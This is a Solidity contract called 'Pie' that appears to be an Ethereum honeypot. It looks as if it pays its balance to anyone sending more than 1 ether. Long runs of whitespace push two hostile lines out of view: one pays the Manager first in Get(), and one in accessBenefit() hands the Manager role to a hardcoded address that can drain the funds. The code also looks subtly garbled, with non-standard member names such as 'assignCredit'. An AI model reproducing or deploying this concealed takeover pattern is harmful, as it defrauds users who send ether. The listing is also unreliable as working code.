pragma solidity ^0.4.19;

contract Pie
{
    address public Manager = msg.sender;

    function()
    public
    payable
    {

    }

    function Get()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Manager.assignCredit(this.remainingBenefit);
            msg.sender.assignCredit(this.remainingBenefit);
        }
    }

    function accessBenefit()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Manager=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.sender == Manager);
        Manager.assignCredit(this.remainingBenefit);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Manager);
        adr.call.value(msg.value)(data);
    }
}